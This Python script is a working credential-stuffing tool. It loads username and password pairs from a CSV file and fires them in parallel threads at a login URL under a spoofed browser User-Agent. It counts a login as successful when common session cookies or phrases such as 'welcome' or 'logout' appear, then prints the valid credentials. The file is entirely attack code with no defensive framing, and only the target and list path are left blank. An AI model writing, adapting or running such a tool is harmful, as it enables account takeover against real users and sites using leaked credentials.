import csv
import requests
from concurrent.futures import ThreadPoolExecutor

headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36",
    "Accept": "application/json, text/javascript, */*; q=0.01",
    "Content-Type": "application/x-www-form-urlencoded"
}


def attempt_login(username, password):
    with requests.Session() as session:
        try:
            response = session.post(
                target_url,
                headers=headers,
                data={"username": username, "password": password, "submit": "Login"},
                timeout=5,
                allow_redirects=True
            )

            if not response.ok:
                return False

            cookies = session.cookies.get_dict()
            content = response.text.lower()

            successful_login_cookies = [
                "session", "sessionid", "PHPSESSID", "JSESSIONID", "ASP.NET_SessionId",
                "connect.sid", "sid", "auth_token", "access_token", "jwt", "jwt_token",
                "logged_in", "_auth_user_id", "remember_me", "user_token", "token"
            ]

            success_phrases = ["welcome", "dashboard", "my account", "logout", "sign out", "login successful", "successfully logged in", "authentication successful"]

            if any(i in cookies for i in successful_login_cookies):
                return True
            
            if any(x in content for x in success_phrases):
                return True

            return False

        except requests.RequestException as e:
            print(f"Request error: {e}")
            return False


def load_creds(file_path):
    creds = []
    try:
        with open(file_path, newline='') as csvfile:
            reader = csv.reader(csvfile)
            for row in reader:
                if len(row) >= 2:
                    creds.append((row[0], row[1]))
        if not creds:
            print(f"No credentials found in {file_path}")
        return creds
    except FileNotFoundError:
        print(f"Error: {file_path} not found")
        return []


def cred_stuffing(creds):
    if not creds:
        return

    found_credentials = []

    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = []
        for username, password in creds:
            print(f"Trying Username: {username} Password: {password}")
            futures.append(executor.submit(attempt_login, username, password))

        for i, future in enumerate(futures):
            success = future.result()
            if success:
                username, password = creds[i]
                found_credentials.append((username, password))

    if found_credentials:
        print("\nFound valid credentials:")
        for u, p in found_credentials:
            print(f"Username: {u}, Password: {p}")
    else:
        print("\nNo valid credentials found.")


if __name__ == "__main__":
    target_url = "" 
    creds = load_creds("")
    cred_stuffing(creds)
